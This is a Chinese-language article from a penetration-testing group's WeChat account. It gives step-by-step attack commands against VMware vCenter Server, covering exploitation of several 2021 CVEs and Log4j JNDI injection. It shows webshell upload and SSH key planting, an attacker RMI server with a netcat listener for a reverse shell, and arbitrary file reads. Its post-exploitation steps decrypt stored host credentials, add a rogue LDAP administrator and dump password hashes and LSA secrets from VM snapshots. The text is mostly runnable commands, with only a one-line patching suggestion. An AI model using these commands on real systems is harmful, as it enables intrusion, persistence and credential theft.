#  vCenter Server 常用攻击手法

原创 ChenZIDu  [ 雷神众测 ](javascript:void\(0\);)

**雷神众测** ![]()

微信号 bounty_team

功能介绍 雷神众测，专注于渗透测试技术及全球最新网络攻击技术的分析。

____

___发表于_

收录于合集

![](https://gitee.com/fuli009/images/raw/master/public/20221207152827.png)

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  
![](https://gitee.com/fuli009/images/raw/master/public/20221207152841.png)

查看版本信息

    
    
    /sdk/vimServiceVersions.xml

  

![](https://gitee.com/fuli009/images/raw/master/public/20221207152841.png)

cve-2021-22005

  

 **1\. 影响范围：**

  * vCenter Server 7.0 < 7.0 U2c build-18356314

  * vCenter Server 6.7 < 6.7 U3o build-18485166

  * Cloud Foundation (vCenter Server) 4.x < KB85718 (4.3)  

  * Cloud Foundation (vCenter Server) 3.x < KB85719 (3.10.2.2)  

  * 6.7 vCenters Windows版本不受影响

    
    
    python3 .\exp.py -t https://192.168.52.152 -s api_all_jdk.jsp

![](https://gitee.com/fuli009/images/raw/master/public/20221207152844.png)

连接木马，默认路径/storage/db/vmware-vmdir/data.mdb

![](https://gitee.com/fuli009/images/raw/master/public/20221207152845.png)

 **2.vcenter_saml_login**

db数据库存放位置

    
    
    数据库存放路径  
    Windows vCenter：C:/ProgramData/VMware/vCenterServer/data/vmdird/data.mdb  
    Linux vCenter：/storage/db/vmware-vmdir/data.mdb

拖到本地利用：vcenter_saml_login  
配置cmd代理，利用netch到本地127.0.0.1:1080

![](https://gitee.com/fuli009/images/raw/master/public/20221207152847.png)

    
    
    python3vcenter_saml_login.py-pdata.mdb-t1*.***.**.***

修改cookie进行连接

![](https://gitee.com/fuli009/images/raw/master/public/20221207152848.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20221207152841.png)

CVE-2021-21972

影响范围

  * vCenter Server7.0 < 7.0.U1c  

  * vCenter Server6.7 < 6.7.U3l  

  * vCenter Server6.5 < 6.5.U3n

    
    
    /ui/vropspluginui/rest/services/uploadova

访问上面的路径，如果404，则代表不存在漏洞，如果405 则可能存在漏洞。

 **1.windows机器：**

漏洞利用：https://github.com/horizon3ai/CVE-2021-21972

    
    
    python CVE-2021-21972.py -t x.x.x.x -p c:\\ProgramData\VMware\vCenterServer\data\perfcharts\tc-instance\webapps\statsreport\gsl.jsp -o win -f gsl.jsp  
      
    -t （目标地址）  
    -f （上传的文件）  
    -p （上传后的webshell路径，默认不用改）

上传后路径

    
    
    https://x.x.x.x/statsreport/gsl.jsp  
    C:/ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport

![](https://gitee.com/fuli009/images/raw/master/public/20221207152850.png)

 **2\. linux机器**

写公私钥（需要22端口开放）

    
    
    python3 CVE-2021-21972.py -t 10.16.8.168 -p /home/vsphere-ui/.ssh/authorized_keys -o unix -f c://Users/think/.ssh/id_rsa.pub

遍历写shell（时间较久）

![](https://gitee.com/fuli009/images/raw/master/public/20221207152852.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20221207152841.png)

CVE-2021-21985

    
    
    java -cp  JNDI-Injection-Bypass-1.0-SNAPSHOT-all.jar payloads.EvilRMIServer 8.8.8.8  
      
    nc -lvvp 55552  
      
    python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit

  

![](https://gitee.com/fuli009/images/raw/master/public/20221207152841.png)

Log4j

  

${jndi:ldap://exp}

    
    
    java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "cmd /c whoami" -A "172.30.84.134"  
      
    java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,base编码内容}|{base64,-d}|{bash,-i}" -A "ip"

![](https://gitee.com/fuli009/images/raw/master/public/20221207152856.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20221207152841.png)

vmware未授权任意文件读取漏洞

 **漏洞影响版本**

已知影响版本 VMware vCenter 6.5.0a-f  
安全版本 VMware vCenter 6.5u1

    
    
    # windows  
    /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties  
      
    # linux  
    /eam/vib?id=/etc/passwd

![](https://gitee.com/fuli009/images/raw/master/public/20221207152858.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20221207152841.png)

vCenter低权限账户提权思路

 **获取ssh权限后修改密码**

    
    
    # Linux   
    /usr/lib/vmware-vmdir/bin/vdcadmintool   
      
    # Windows   
    C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe  
      
      
    # 输入3回车  
    # 然后输入用户名(用户名输入错误会提示：VmDirForceResetPassword failed (9106))  
    # 复制生成的新密码(新密码不能自定义，只能工具生成的)  
    ==================  
    Please select:  
    0. exit  
    1. Test LDAP connectivity  
    2. Force start replication cycle  
    3. Reset account password  
    4. Set log level and mask  
    5. Set vmdir state  
    6. Get vmdir state  
    7. Get vmdir log level and mask  
    ==================

 **Vmware数据库配置文件**

    
    
    # linux  
    /etc/vmware-vpx/vcdb.properties  
    /etc/vmware/service-state/vpxd/vcdb.properties  
      
    # windows  
    C:\ProgramData\VMware\vCenterServer\cfg\vmware-vps\vcdb.properties

连接数据库，读取 vpxuser 密钥

    
    
    # linux  
    /opt/vmware/vpostgres/current/bin/psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc  
      
    # windows  
    C:\Program Files\VMware\vCenter Server\vPostgres\bin\psql.exe -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;" > password.enc

 **获取symkey.dat文件**

    
    
    # linux  
    /etc/vmware-vpx/ssl/symkey.dat  
      
    # windows  
    C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat

 ****

解密 vpxuser 密码

    
    
    python3 decrypt.py symkey.dat password.enc password.txt

 **拿到权限后添加账户**

添加账户

    
    
    python vCenterLDAP_Manage.py adduser  
    input the new username: 1234admininput the dn: cn=1234admin,cn=Users,dc=vsphere,dc=localinput the userPrincipalName: 1234admin@vsphere.local

提升至管理员

    
    
    python vCenterLDAP_Manage.py addadmininput the user dn: cn=1234admin,cn=Users,dc=vsphere,dc=local

  

  

![](https://gitee.com/fuli009/images/raw/master/public/20221207152841.png)

后续

 **创建快照**

![](https://gitee.com/fuli009/images/raw/master/public/20221207152902.png)

分析快照文件需要.vmem文件作为参数，而.vmem文件通常很大，为了提高效率，这里选择将volatility上传至VMware ESXI，在VMware
ESXI上分析快照文件。

volatility下载：

Windows：

http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_win64_standalone.exe

Linux：

http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_lin64_standalone.zip

 **volatility利用**

通过镜像信息获得系统版本，命令如下

    
    
    .\volatility_2.6_win64_standalone.exe -f xxxx-Snapshot2.vmem imageinfo

读取profile，列出注册表内容

    
    
    .\volatility_2.6_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hivelist  
      
    ## 关注  
    REGISTRY\MACHINE\SYSTEM  
    SystemRoot\System32\Config\SAM

使用hashdump获取hash值

    
    
    .\volatility_2.6_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx hashdump -y 0xfffff8a000024010 -s 0xfffff8a000478010

从注册表读取LSA Secrets

    
    
    .\volatility_2.6_win64_standalone.exe -f xxx-Snapshot2.vmem --profile=xxx lsadump

 **修复建议： 及时测试并升级到最新版本或升级版本。**

  

 **安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![](https://gitee.com/fuli009/images/raw/master/public/20221207152904.png)

END

![](https://gitee.com/fuli009/images/raw/master/public/20221207152905.png)![](https://gitee.com/fuli009/images/raw/master/public/20221207152906.png)![](https://gitee.com/fuli009/images/raw/master/public/20221207152907.png)

 **长按识别二维码关注我们**

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

